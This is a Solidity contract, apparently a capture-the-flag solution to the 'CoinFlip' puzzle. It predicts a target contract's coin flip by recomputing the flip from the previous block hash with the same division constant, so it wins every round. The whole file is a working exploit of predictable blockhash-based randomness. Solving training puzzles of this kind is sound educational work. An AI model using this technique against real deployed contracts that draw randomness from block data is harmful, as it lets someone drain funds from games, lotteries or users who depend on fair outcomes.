pragma solidity ^0.5.0;

import 'openzeppelin-solidity/contracts/math/SafeMath.sol';

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipExploit {

    using SafeMath for uint256;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    CoinFlip innerCoinFlip;

    constructor(address _coinFlip) public{
        innerCoinFlip = CoinFlip(_coinFlip);
    }

    function flip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        return innerCoinFlip.flip(side);

    }
}
